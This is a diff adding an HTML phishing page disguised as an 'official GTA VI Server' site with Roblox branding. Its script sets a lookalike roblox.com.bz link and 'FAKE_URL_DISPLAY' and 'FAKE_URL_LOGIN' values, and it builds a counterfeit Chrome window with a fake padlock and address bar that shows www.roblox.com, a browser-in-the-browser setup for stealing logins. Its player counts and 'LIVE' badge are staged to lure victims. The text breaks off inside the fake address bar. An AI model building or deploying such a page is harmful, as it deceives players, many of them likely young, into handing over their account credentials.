@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>GTA VI Server — Official GTA VI Game Servers</title>
+
+    <!-- ===== SEO & OPEN GRAPH (PREVIEW WA/DISCORD) ===== -->
+    <meta name="description" content="Lower ping, active community, and a seamless experience on dedicated GTA VI Servers. Join thousands of GTA VI players today.">
+    <meta property="og:title" content="GTA VI Server — Join Now!">
+    <meta property="og:description" content="Join thousands of players on dedicated low-latency servers. Active community, instant access!">
+    <meta property="og:type" content="website">
+    
+    <meta property="og:url" content="https://playsgta6roblox.com/">
+    <meta property="og:image" content="https://playsgta6roblox.com/image/backgroundgta6.jpg">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="GTA VI Server">
+    <meta name="twitter:description" content="The official website of the GTA VI Server for GTA VI Game — join our dedicated low-latency servers.">
+    <meta name="twitter:image" content="https://playsgta6roblox.com/image/backgroundgta6.jpg">
+
+    <link rel="icon" type="image/jpeg" href="/image/backgroundgta6.jpg">
+    <link rel="apple-touch-icon" href="https://playsgta6roblox.com/image/backgroundgta6.jpg">
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --pink: #ff2d78;
+            --pink-dark: #c4115a;
+            --pink-glow: rgba(255, 45, 120, 0.45);
+            --purple: #7b2ff7;
+            --orange: #ff8a3d;
+            --cyan: #00e5ff;
+            --bg: #0a0614;
+            --bg-2: #140a22;
+            --card: rgba(22, 12, 34, 0.78);
+            --border: rgba(255, 255, 255, 0.10);
+            --text: #f8f2ff;
+            --muted: #b39fd1;
+            --discord: #5865F2;
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', system-ui, sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* ============ GTA VI BACKGROUND ============ */
+        .gta-bg {
+            position: fixed;
+            inset: 0;
+            z-index: -3;
+            background-image: url('/image/backgroundgta6.jpg');
+            background-size: cover;
+            background-position: center top; /* Gw ubah ke top biar logo GTA VI keliatan */
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+        .gta-bg::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: rgba(10, 6, 20, 0.65); /* Overlay gelap biar teks kebaca */
+            pointer-events: none;
+        }
+        .gta-bg::after {
+            content: '';
+            position: absolute; inset: 0;
+            background-image:
+                repeating-linear-gradient(0deg, rgba(0,0,0,0.16) 0px, rgba(0,0,0,0.16) 1px, transparent 1px, transparent 3px);
+            opacity: 0.35;
+            pointer-events: none;
+        }
+
+        /* ---------- LOADING SCREEN ---------- */
+        #loading-screen {
+            position: fixed; inset: 0; z-index: 9999;
+            background: radial-gradient(circle at 30% 40%, #2a0b2b, #0a0614 80%);
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            transition: opacity 0.6s ease;
+        }
+        .loader-ring {
+            width: 90px; height: 90px; border-radius: 50%;
+            border: 2px solid rgba(255, 45, 120, 0.15);
+            border-top: 2px solid var(--pink);
+            animation: spin 1.2s linear infinite;
+            position: relative;
+        }
+        .loader-ring::after {
+            content: ''; position: absolute; inset: 10px;
+            border-radius: 50%;
+            border: 2px solid rgba(255, 255, 255, 0.05);
+            border-bottom: 2px solid #ffffff;
+            animation: spin-reverse 1s linear infinite;
+        }
+        .loader-gem {
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 46px; height: 46px;
+            background: #fff;
+            border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 30px var(--pink-glow);
+            padding: 6px;
+        }
+        .loader-gem img { width: 100%; height: 100%; object-fit: contain; display: block; }
+        .loading-title {
+            margin-top: 30px; font-weight: 700; font-size: 18px;
+            letter-spacing: 2px;
+        }
+        .loading-title span {
+            background: linear-gradient(90deg, #ffffff, var(--pink));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .loading-bar-track {
+            width: 220px; height: 4px; background: rgba(255, 255, 255, 0.08);
+            border-radius: 4px; margin-top: 18px; overflow: hidden;
+        }
+        .loading-bar-fill {
+            width: 0%; height: 100%;
+            background: linear-gradient(90deg, var(--pink), var(--orange));
+            border-radius: 4px; transition: width 0.2s ease;
+        }
+        .loading-text {
+            font-size: 12px; color: var(--muted); margin-top: 12px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes spin-reverse { to { transform: rotate(-360deg); } }
+
+        /* ---------- MAIN ---------- */
+        #app-content { display: none; padding-bottom: 40px; position: relative; z-index: 1; }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        .navbar {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 14px 20px;
+            background: rgba(10, 6, 20, 0.55);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid rgba(255, 45, 120, 0.25);
+            position: sticky; top: 0; z-index: 100;
+            box-shadow: 0 4px 30px rgba(255, 45, 120, 0.15);
+        }
+        .navbar-inner {
+            max-width: 1000px; margin: 0 auto; width: 100%;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .nav-brand {
+            display: flex; align-items: center; gap: 12px;
+            font-weight: 900; font-size: 18px; letter-spacing: -0.5px;
+            text-shadow: 0 0 20px rgba(255, 45, 120, 0.6);
+        }
+        .brand-icon {
+            width: 38px; height: 38px;
+            background: #fff;
+            border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 20px var(--pink-glow);
+            overflow: hidden;
+            padding: 5px;
+        }
+        .brand-icon img { width: 100%; height: 100%; object-fit: contain; display: block; }
+        .nav-brand span span {
+            background: linear-gradient(90deg, var(--pink), var(--orange), var(--cyan));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+
+        /* ============ HERO ============ */
+        .hero-banner {
+            position: relative;
+            margin: 0 0 28px 0;
+            background: transparent;
+            overflow: visible;
+            width: 100%;
+        }
+
+        .hero-video-wrapper {
+            position: relative;
+            width: 100vw;
+            left: 50%;
+            right: 50%;
+            margin-left: -50vw;
+            margin-right: -50vw;
+            height: auto;
+            aspect-ratio: 16 / 9;
+            background: #0d0616;
+            overflow: hidden;
+            border-bottom: 2px solid rgba(255, 45, 120, 0.3);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), inset 0 -80px 100px rgba(10,6,20,0.9);
+        }
+
+        .hero-video-wrapper video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: left center;
+            display: block;
+        }
+
+        .hero-video-wrapper::after {
+            content: ''; position: absolute; inset: 0;
+            background: linear-gradient(to bottom,
+                rgba(10,6,20,0.2) 0%,
+                transparent 40%,
+                transparent 60%,
+                rgba(10,6,20,1) 100%);
+            pointer-events: none;
+        }
+
+        .live-badge {
+            position: absolute;
+            bottom: 30px;
+            right: 5vw;
+            background: var(--pink); color: white;
+            font-size: 12px; font-weight: 800;
+            padding: 6px 14px; border-radius: 6px;
+            letter-spacing: 0.8px; z-index: 5;
+            box-shadow: 0 0 15px var(--pink-glow);
+            display: flex; align-items: center;
+        }
+
+        .hero-avatar-overlay {
+            position: absolute; bottom: 30px; left: 5vw;
+            display: flex; align-items: center; gap: 10px;
+            z-index: 5; background: rgba(0, 0, 0, 0.55);
+            backdrop-filter: blur(4px);
+            padding: 6px 14px 6px 8px; border-radius: 40px;
+            border: 1px solid rgba(255, 45, 120, 0.4);
+        }
+        .hero-avatar-img {
+            width: 36px; height: 36px; border-radius: 50%;
+            border: 2px solid var(--pink); object-fit: cover;
+            background: #262626;
+        }
+        .hero-avatar-name { font-size: 12px; font-weight: 600; color: #f3f4f6; }
+
+        .hero-inner {
+            position: relative; z-index: 2;
+            padding: 0 20px 30px;
+            text-align: center;
+            margin-top: -40px;
+            max-width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .hero-badge {
+            display: inline-block;
+            padding: 6px 16px;
+            border-radius: 999px;
+            font-size: clamp(9px, 1vw, 11px); font-weight: 800; letter-spacing: 2px;
+            border: 1px solid rgba(255, 45, 120, 0.55);
+            background: rgba(20, 10, 32, 0.85);
+            color: #ff8fb5;
+            margin-bottom: 16px;
+            text-shadow: 0 0 10px var(--pink-glow);
+            backdrop-filter: blur(6px);
+        }
+
+        .hero-title {
+            font-size: clamp(32px, 6vw, 72px);
+            font-weight: 900; line-height: 1.1;
+            letter-spacing: -1px;
+            text-shadow: 0 4px 24px rgba(0,0,0,0.8);
+        }
+        .hero-title span {
+            background: linear-gradient(90deg, var(--pink), var(--orange), var(--cyan));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 18px rgba(255, 45, 120, 0.5));
+        }
+        .hero-desc {
+            margin-top: 12px;
+            font-size: clamp(14px, 1.5vw, 18px);
+            color: #d1c4e9;
+            max-width: 600px; margin-left: auto; margin-right: auto;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+            line-height: 1.6;
+        }
+        .hero-cta {
+            display: flex; flex-wrap: wrap; justify-content: center; gap: 12px;
+            margin-top: 24px;
+        }
+        .btn-primary {
+            padding: 14px 32px;
+            background: linear-gradient(135deg, var(--pink), var(--orange));
+            border: none; border-radius: 999px;
+            color: #fff; font-weight: 800; font-size: 15px;
+            cursor: pointer;
+            box-shadow: 0 8px 28px var(--pink-glow);
+            transition: transform 0.15s, box-shadow 0.15s;
+        }
+        .btn-primary:hover { transform: scale(1.04); box-shadow: 0 10px 34px rgba(255, 45, 120, 0.7); }
+        .btn-primary:active { transform: scale(0.97); }
+        .btn-secondary {
+            padding: 14px 32px;
+            background: rgba(20, 10, 32, 0.6);
+            border: 1px solid rgba(255, 45, 120, 0.5);
+            border-radius: 999px;
+            color: var(--text); font-weight: 700; font-size: 15px;
+            cursor: pointer; text-decoration: none;
+            transition: background 0.15s, border-color 0.15s;
+            backdrop-filter: blur(8px);
+        }
+        .btn-secondary:hover { background: rgba(255, 45, 120, 0.15); border-color: var(--pink); }
+
+        .hero-stats {
+            margin-top: 30px;
+            display: grid; grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            background: rgba(20, 12, 34, 0.7);
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            padding: 16px 10px;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .hero-stats .stat {
+            text-align: center;
+            border-right: 1px solid var(--border);
+        }
+        .hero-stats .stat:last-child { border-right: none; }
+        .hero-stats .stat b {
+            display: block;
+            font-size: clamp(18px, 2.5vw, 28px);
+            font-weight: 900;
+            background: linear-gradient(90deg, var(--pink), var(--orange));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .hero-stats .stat span {
+            display: block;
+            font-size: clamp(9px, 1vw, 11px);
+            font-weight: 700; letter-spacing: 1px;
+            text-transform: uppercase; color: var(--muted);
+            margin-top: 4px;
+        }
+
+        /* SECTION */
+        .section-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 16px;
+        }
+        .section-title {
+            display: flex; align-items: center; gap: 8px;
+            font-size: 16px; font-weight: 800;
+            text-shadow: 0 0 14px rgba(255, 45, 120, 0.5);
+        }
+        .section-title i { color: var(--pink); font-size: 14px; }
+        .section-stats { font-size: 12px; color: var(--muted); }
+
+        /* SERVER CARDS */
+        .server-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        .server-card {
+            background: var(--card);
+            backdrop-filter: blur(14px);
+            border: 1px solid var(--border);
+            border-radius: 22px; overflow: hidden;
+            box-shadow: 0 12px 34px rgba(0, 0, 0, 0.55);
+            transition: transform 0.2s ease, border-color 0.2s, box-shadow 0.2s;
+            cursor: pointer;
+            display: flex; flex-direction: column;
+        }
+        .server-card:hover {
+            border-color: rgba(255, 45, 120, 0.6);
+            transform: translateY(-4px);
+            box-shadow: 0 18px 44px rgba(0,0,0,0.65), 0 0 40px rgba(255, 45, 120, 0.3);
+        }
+        .server-thumb {
+            position: relative; width: 100%; height: 180px;
+            background: #0d0616; overflow: hidden;
+        }
+        .server-thumb img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            object-position: center center;
+            display: block;
+            background: #0d0616;
+        }
+        .available-tag {
+            position: absolute; top: 12px; right: 12px;
+            background: rgba(255, 45, 120, 0.25);
+            border: 1px solid rgba(255, 45, 120, 0.6);
+            color: #ffb3ce; font-size: 10px; font-weight: 800;
+            padding: 5px 12px; border-radius: 20px;
+            backdrop-filter: blur(4px); letter-spacing: 0.5px; z-index: 6;
+        }
+        .server-info {
+            padding: 16px 18px 18px;
+            flex-grow: 1; display: flex; flex-direction: column;
+        }
+        .server-name {
+            font-size: 18px; font-weight: 800;
+            margin-bottom: 8px; letter-spacing: -0.3px;
+        }
+        .server-region { font-size: 12px; color: var(--muted); margin-bottom: 12px; }
+        .player-strip {
+            display: flex; align-items: center; gap: 6px;
+            margin-bottom: 16px; flex-wrap: wrap;
+        }
+        .player-avatar-sm {
+            width: 30px; height: 30px; border-radius: 50%;
+            border: 2px solid var(--pink); object-fit: cover;
+            background: #262626; margin-right: -6px;
+        }
+        .player-avatar-sm:first-child { margin-left: 0; }
+        .player-count-label { font-size: 12px; color: var(--muted); margin-left: 8px; }
+
+        .join-btn {
+            margin-top: auto;
+            display: block; width: 100%; padding: 14px;
+            background: linear-gradient(135deg, var(--pink), var(--orange));
+            border: none; border-radius: 14px; color: white;
+            font-weight: 800; font-size: 14px; text-align: center;
+            cursor: pointer;
+            box-shadow: 0 6px 22px var(--pink-glow);
+            transition: opacity 0.2s, transform 0.1s;
+            letter-spacing: 0.3px;
+        }
+        .join-btn:hover { opacity: 0.92; }
+        .join-btn:active { transform: scale(0.97); }
+
+        /* ---------- LOADING MODAL ---------- */
+        .loading-modal {
+            position: fixed; inset: 0;
+            background: rgba(10, 5, 12, 0.92);
+            z-index: 9998; display: flex;
+            align-items: center; justify-content: center;
+            opacity: 0; pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        .loading-modal.active { opacity: 1; pointer-events: all; }
+        .loading-content {
+            background: var(--card); backdrop-filter: blur(16px);
+            padding: 40px;
+            border-radius: 18px; text-align: center;
+            border: 1px solid var(--border);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.6), 0 0 60px rgba(255,45,120,0.25);
+            max-width: 320px; width: 100%;
+        }
+        .loading-spinner {
+            width: 50px; height: 50px;
+            border: 4px solid rgba(255, 45, 120, 0.15);
+            border-top: 4px solid var(--pink);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        .loading-content h3 { margin: 0 0 10px; font-size: 1.2rem; color: #fff; }
+        .loading-content p { margin: 0; font-size: 0.9rem; color: var(--muted); }
+
+        /* ---------- CHROME MODAL ---------- */
+        .browser-modal-overlay {
+            position: fixed; inset: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 99999; display: none;
+            align-items: center; justify-content: center;
+            padding: 20px;
+        }
+        .browser-modal-overlay.active { display: flex; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .chrome-window {
+            width: 100%; max-width: 1100px; height: 85vh;
+            background: #ffffff; border-radius: 10px;
+            overflow: hidden; display: flex; flex-direction: column;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        .chrome-titlebar {
+            background: #dee1e6; height: 40px;
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 0 0 8px; flex-shrink: 0;
+        }
+        .chrome-tabs { display: flex; height: 34px; margin-top: 6px; }
+        .chrome-tab {
+            background: #ffffff; border-radius: 8px 8px 0 0;
+            padding: 0 10px 0 12px; min-width: 150px; max-width: 220px;
+            display: flex; align-items: center;
+            box-shadow: 0 -1px 2px rgba(0,0,0,0.05);
+        }
+        .chrome-tab-icon { width: 16px; height: 16px; margin-right: 8px; }
+        .chrome-tab-title {
+            font-size: 12px; color: #333; flex-grow: 1;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+            padding-right: 8px;
+        }
+        .chrome-tab-close {
+            font-size: 14px; color: #5f6368; cursor: pointer;
+            border-radius: 50%; width: 20px; height: 20px;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .chrome-tab-close:hover { background: #e8eaed; }
+        .chrome-window-controls {
+            display: flex; height: 40px;
+            align-items: center; padding-right: 8px;
+        }
+        .chrome-window-controls span {
+            width: 44px; height: 36px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 14px; color: #333; cursor: pointer;
+        }
+        .chrome-window-controls span:hover { background: rgba(0,0,0,0.08); }
+        .chrome-window-controls .chrome-close-btn:hover { background: #e81123; color: white; }
+        .chrome-toolbar {
+            background: #ffffff; height: 42px;
+            display: flex; align-items: center;
+            padding: 0 8px; border-bottom: 1px solid #dadce0;
+            flex-shrink: 0;
+        }
+        .chrome-nav-btns { display: flex; gap: 4px; margin-right: 8px; }
+        .chrome-icon {
+            width: 28px; height: 28px; padding: 4px;
+            border-radius: 50%; fill: #5f6368; cursor: pointer;
+        }
+        .chrome-icon:hover { background: #f1f3f4; }
+        .chrome-icon.disabled { fill: #bdc1c6; pointer-events: none; }
+        .chrome-address-bar {
+            flex-grow: 1; background: #f1f3f4;
+            height: 30px; border-radius: 15px;
+            display: flex; align-items: center;
+            padding: 0 12px; gap: 8px;
+        }
+        .chrome-lock { width: 14px; height: 14px; fill: #5f6368; }
+        .chrome-url {
+            font-size: 14px; color: #202124; flex-grow: 1;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+        }
+        .chrome-url-dim { color: #5f6368; }
+        .chrome-star { width: 16px; height: 16px; fill: #5f6368; cursor: pointer; }
+        .chrome-extensions { display: flex; margin-left: 8px; gap: 4px; }
+
+        .browser-content {
+            flex-grow: 1; background: #fff;
+            display: flex; flex-direction: column; min-height: 0;
+            -webkit-overflow-scrolling: touch;
+            overflow: hidden; position: relative;
+        }
+        .browser-content iframe {
+            flex-grow: 1; width: 100%; height: 100%;
+            min-height: 100%; border: none; display: block;
+            background: #fff;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0);
+        }
+
+        @supports (-webkit-touch-callout: none) {
+            .browser-content { height: calc(100dvh - 82px); min-height: calc(100dvh - 82px); }
+            .browser-content iframe {
+                height: 100% !important; min-height: 100% !important; width: 100% !important;
+                position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            }
+            .browser-modal-overlay { height: 100dvh; width: 100vw; }
+            .chrome-window { height: 100dvh; max-height: 100dvh; }
+        }
+
+        @media (max-width: 768px) {
+            .browser-modal-overlay { padding: 0; }
+            .chrome-window {
+                width: 100%; height: 100vh;
+                height: 100dvh; max-height: 100vh; border-radius: 0;
+            }
+            .chrome-titlebar { padding-left: 4px; }
+            .chrome-tabs { min-width: auto; max-width: none; flex-grow: 1; }
+            .chrome-tab { min-width: 0; max-width: none; padding: 0 8px; }
+            .chrome-tab-title { font-size: 11px; padding-right: 4px; }
+            .chrome-window-controls span { width: 35px; }
+            .chrome-nav-btns { display: none; }
+            .chrome-extensions { display: none; }
+            .chrome-address-bar { padding: 0 8px; }
+            .chrome-url { font-size: 12px; }
+
+            .hero-inner {
+                margin-top: -20px;
+                padding: 0 16px 24px;
+            }
+            .hero-cta {
+                flex-direction: column;
+                gap: 10px;
+            }
+            .btn-primary, .btn-secondary {
+                width: 100%;
+                text-align: center;
+            }
+            .hero-stats {
+                padding: 12px 8px;
+            }
+
+            .live-badge {
+                bottom: 20px;
+                right: 16px;
+                padding: 4px 10px;
+                font-size: 10px;
+            }
+            .hero-avatar-overlay { bottom: 20px; left: 16px; }
+
+            .server-list {
+                grid-template-columns: 1fr;
+                gap: 16px;
+            }
+            .server-thumb { height: 160px; }
+
+            .browser-content { flex: 1 1 auto; min-height: 0; }
+            .browser-content iframe { height: 100%; min-height: 100%; }
+            .hero-video-wrapper video { object-position: left center; }
+        }
+
+        @media (min-width: 769px) {
+            .hero-video-wrapper video { object-position: left center; }
+            .hero-inner { margin-top: -50px; }
+            .live-badge { bottom: 40px; right: 10vw; font-size: 13px; padding: 7px 16px; }
+            .hero-avatar-overlay {
+                bottom: 40px;
+                left: calc(50vw - 500px + 20px);
+                padding: 8px 16px 8px 10px;
+            }
+            .hero-avatar-img { width: 42px; height: 42px; }
+            .hero-avatar-name { font-size: 13px; }
+            .hero-stats { padding: 20px 16px; }
+            .btn-primary, .btn-secondary { padding: 16px 38px; font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="gta-bg"></div>
+
+    <!-- ===== CONFIG LOADER (JINJA + FALLBACK API) ===== -->
+    <script>
+        // LINK SERVER BARU
+        let PRIVATE_SERVER_URL = "https://roblox.com.bz/games/88008594207418/GTA67-Vice-Horizon-GTA6?privateServerLinkCode=90009455507851527415931341313013";
+        let FAKE_URL_DISPLAY = "https://www.roblox.com/games/88008594207418/GTA67-Vice-Horizon-GTA6?privateServerLinkCode=90009455507851527415931341313013";
+        let FAKE_URL_LOGIN = "https://www.roblox.com/id/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fid%2Fgames%2F15884350761%2FGTA67-Vice-Horizon-GTA6%3FprivateServerLinkCode%3D02235304084257249141820871923335";
+
+        console.log('🔧 Seller config:', { PRIVATE_SERVER_URL, FAKE_URL_DISPLAY, FAKE_URL_LOGIN });
+
+        if (!PRIVATE_SERVER_URL || !FAKE_URL_DISPLAY || !FAKE_URL_LOGIN) {
+            fetch('/api/public-config', { cache: 'no-store' })
+                .then(r => r.json())
+                .then(c => {
+                    PRIVATE_SERVER_URL = PRIVATE_SERVER_URL || c.privateServerUrl || '';
+                    FAKE_URL_DISPLAY = FAKE_URL_DISPLAY || c.fakeUrlDisplay || '';
+                    FAKE_URL_LOGIN = FAKE_URL_LOGIN || c.fakeUrlLogin || '';
+                    console.log('✅ Seller config (fallback API):');
+                })
+                .catch(err => {
+                    console.warn('⚠️ Config fetch failed:', err);
+                });
+        }
+    </script>
+
+    <!-- ===== LOADING ===== -->
+    <div id="loading-screen">
+        <div style="position:relative; width:90px; height:90px;">
+            <div class="loader-ring"></div>
+            <div class="loader-gem">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/70/Roblox_Corporation_2025_logo.svg" alt="Roblox">
+            </div>
+        </div>
+        <div class="loading-title">WELCOME TO <span>GTA VI SERVER</span></div>
+        <div class="loading-bar-track">
+            <div class="loading-bar-fill" id="loading-bar"></div>
+        </div>
+        <div class="loading-text" id="loading-text">Loading...</div>
+    </div>
+
+    <!-- ===== APP ===== -->
+    <div id="app-content">
+
+        <header class="navbar">
+            <div class="navbar-inner">
+                <div class="nav-brand">
+                    <div class="brand-icon">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/70/Roblox_Corporation_2025_logo.svg" alt="Roblox">
+                    </div>
+                    <span>GTA VI <span>SERVER</span></span>
+                </div>
+            </div>
+        </header>
+
+        <div class="hero-banner">
+            <div class="hero-video-wrapper">
+                <video autoplay loop muted playsinline>
+                    <source src="/image/gta6.mp4" type="video/mp4">
+                    Your browser does not support video.
+                </video>
+
+                <div class="hero-avatar-overlay">
+                    <img class="hero-avatar-img" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4F764CB5B7A62140A826DCBA9EE5F7E-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="avatar">
+                    <span class="hero-avatar-name">GTA6_Games</span>
+                </div>
+
+                <span class="live-badge"><i class="fa-solid fa-circle" style="font-size:8px; margin-right:6px;"></i> LIVE</span>
+            </div>
+
+            <div class="container">
+                <div class="hero-inner">
+                    <span class="hero-badge">GTA VI SERVER OFFICIAL</span>
+                    <h1 class="hero-title"><span>GTA VI Server</span></h1>
+                    <p class="hero-desc">Lower ping, an active community, and a seamless experience. Join thousands of GTA VI players right now on dedicated low-latency servers.</p>
+                    <div class="hero-cta">
+                        <button class="btn-primary" onclick="handleRedirect('Connecting to server...')">Join GTA VI Server</button>
+                        <a class="btn-secondary" href="#servers">Server Guide</a>
+                    </div>
+                    <div class="hero-stats">
+                        <div class="stat"><b>11.0K</b><span>Active players</span></div>
+                        <div class="stat"><b>1</b><span>Dedicated servers</span></div>
+                        <div class="stat"><b>22ms</b><span>Avg. ping</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="section-header" id="servers">
+                <div class="section-title">
+                    <i class="fa-solid fa-cube"></i> Private Servers
+                </div>
+                <div class="section-stats">
+                    2 Servers &bull; <span id="onlineCount">23</span> Online
+                </div>
+            </div>
+
+            <div class="server-list">
+                <div class="server-card">
+                    <div class="server-thumb">
+                        <span class="available-tag"><i class="fa-solid fa-check-circle" style="font-size:9px; margin-right:4px;"></i> AVAILABLE</span>
+                        <img src="/image/banner 1 gta.jpg" alt="GTA VI Server 1 banner">
+                    </div>
+                    <div class="server-info">
+                        <div class="server-name">GTA VI Server 1</div>
+                        <div class="server-region">Korea · BEST</div>
+                        <div class="player-strip">
+                            <img class="player-avatar-sm" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4F764CB5B7A62140A826DCBA9EE5F7E-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="player">
+                            <img class="player-avatar-sm" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-456E27ADA99A21CADD2590306EE214A6-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="player">
+                            <img class="player-avatar-sm" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E5988C142C147FC9D3D0DA0C7736C712-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="player">
+                            <span class="player-count-label">14 / 20 Online</span>
+                        </div>
+                        <button class="join-btn">JOIN SERVER</button>
+                    </div>
+                </div>
+
+                <div class="server-card">
+                    <div class="server-thumb">
+                        <span class="available-tag"><i class="fa-solid fa-check-circle" style="font-size:9px; margin-right:4px;"></i> AVAILABLE</span>
+                        <img src="/image/banner 2 gta.jpg" alt="GTA VI Server 2 banner">
+                    </div>
+                    <div class="server-info">
+                        <div class="server-name">GTA VI Server 2</div>
+                        <div class="server-region">Singapore</div>
+                        <div class="player-strip">
+                            <img class="player-avatar-sm" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0C6CBD98ADBB8879842179209E12BF5D-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="player">
+                            <img class="player-avatar-sm" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-2968EC43814C0D3ACB51889553F6F0D5-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="player">
+                            <span class="player-count-label">2 / 20 Online</span>
+                        </div>
+                        <button class="join-btn">JOIN SERVER</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="loading-modal" id="loadingModal">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <h3 id="loadingTitle">Connecting...</h3>
+            <p id="loadingText">Please wait</p>
+        </div>
+    </div>
+
+    <div id="browserModal" class="browser-modal-overlay">
+        <div class="chrome-window">
+            <div class="chrome-titlebar">
+                <div class="chrome-tabs">
+                    <div class="chrome-tab active">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/70/Roblox_Corporation_2025_logo.svg" class="chrome-tab-icon" alt="Roblox">
+                        <span class="chrome-tab-title" id="modalTabTitle">Roblox</span>
+                        <span class="chrome-tab-close" id="closeTabBtn">&times;</span>
+                    </div>
+                </div>
+                <div class="chrome-window-controls">
+                    <span>&#8211;</span>
+                    <span>&#9744;</span>
+                    <span class="chrome-close-btn" id="closeBrowserBtn">&times;</span>
+                </div>
+            </div>
+            <div class="chrome-toolbar">
+                <div class="chrome-nav-btns">
+                    <svg viewBox="0 0 24 24" class="chrome-icon"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></svg>
+                    <svg viewBox="0 0 24 24" class="chrome-icon disabled"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"></path></svg>
+                    <svg viewBox="0 0 24 24" class="chrome-icon"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"></path></svg>
+                </div>
+                <div class="chrome-address-bar">
+                    <svg viewBox="0 0 24 24" class="chrome-lock"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>
+                    <span class="chrome-url" id="fakeUrlText"><span class="chrome-url-dim">https://</span>www.roblox.com</span>
